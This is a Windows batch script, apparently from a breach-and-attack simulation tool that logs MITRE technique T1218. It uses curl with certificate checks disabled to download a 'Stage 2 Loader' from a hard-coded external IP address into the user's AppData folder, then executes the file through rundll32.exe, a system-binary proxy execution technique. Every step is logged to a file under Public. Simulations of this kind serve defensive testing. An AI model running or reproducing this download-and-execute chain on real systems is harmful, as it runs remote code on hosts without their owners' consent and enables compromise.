@echo off
SETLOCAL EnableDelayedExpansion

REM Cache timestamp for debug
SET tsvar=!DATE!/!TIME!

REM Random-variable placeholder declarations (8-12 chars, mixed case)
SET hEaRtBeAt1=https://3.144.153.50/test/stage/2/icon.png?QFxKRW0-R1dK
SET oUtPuTdIr2=%APPDATA%\49912\73dd7f94
SET oUtPuTfIlE3=e072b893.txt
SET aGeNtNaMe4=BALAM-S2B
SET sImId5678=QFxKRW0
SET lOgFiLe67=%PUBLIC%\\macula-simulations.log
SET eNdPoInT8=R1dK
SET eXteRnAl9=https://3.144.153.50/test

REM Step 1: Heartbeat fetch - download Stage 2 Loader from C2
echo [!tsvar!][DEBUG][!aGeNtNaMe4!][!sImId5678!]: heartbeat_start>> "!lOgFiLe67!" 2>nul
curl -k -s -o "!oUtPuTdIr2!\!oUtPuTfIlE3!" "!hEaRtBeAt1!"
set CURL_ERR=!ERRORLEVEL!
if !CURL_ERR! neq 0 (
    echo [!tsvar!][DEBUG][!aGeNtNaMe4!][!sImId5678!]: heartbeat_result=!CURL_ERR!>> "!lOgFiLe67!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!aGeNtNaMe4!][!sImId5678!]: heartbeat_result=0>> "!lOgFiLe67!" 2>nul
)

REM If download failed, log TTP as FAIL and exit
if !CURL_ERR! neq 0 (
    for /f "tokens=1-4 delims=:.," %%a in ("%time%") do set TIMESTAMP_TTP=%date% %%a:%%b:%%c.%%d
    echo [!TIMESTAMP_TTP!][TTP][!aGeNtNaMe4!][!sImId5678!]: T1218^^|System Binary Proxy Execution=FAIL:curl_error=!CURL_ERR!>> "!lOgFiLe67!" 2>nul
    goto :eof
)

REM Step 2: Position working directory
echo [!tsvar!][DEBUG][!aGeNtNaMe4!][!sImId5678!]: chdir_start>> "!lOgFiLe67!" 2>nul
cd /d "!oUtPuTdIr2!" >nul 2>&1
set CD_ERR=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!aGeNtNaMe4!][!sImId5678!]: chdir_result=!CD_ERR!>> "!lOgFiLe67!" 2>nul

REM Step 3: Invoke Stage 2 Loader via LOLBIN (rundll32.exe, RunDLLW entry)
echo [!tsvar!][DEBUG][!aGeNtNaMe4!][!sImId5678!]: rundll32_start>> "!lOgFiLe67!" 2>nul
rundll32.exe "!oUtPuTfIlE3!", RunDLLW
set RUN_ERR=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!aGeNtNaMe4!][!sImId5678!]: rundll32_result=!RUN_ERR!>> "!lOgFiLe67!" 2>nul

REM Step 4: Log TTP result with millisecond timestamp
for /f "tokens=1-4 delims=:.," %%a in ("%time%") do set TIMESTAMP_TTP=%date% %%a:%%b:%%c.%%d
if !RUN_ERR! equ 0 (
    echo [!TIMESTAMP_TTP!][TTP][!aGeNtNaMe4!][!sImId5678!]: T1218^^|System Binary Proxy Execution=OK:>> "!lOgFiLe67!" 2>nul
) else (
    echo [!TIMESTAMP_TTP!][TTP][!aGeNtNaMe4!][!sImId5678!]: T1218^^|System Binary Proxy Execution=FAIL:rundll32_error=!RUN_ERR!>> "!lOgFiLe67!" 2>nul
)

ENDLOCAL
exit /b 0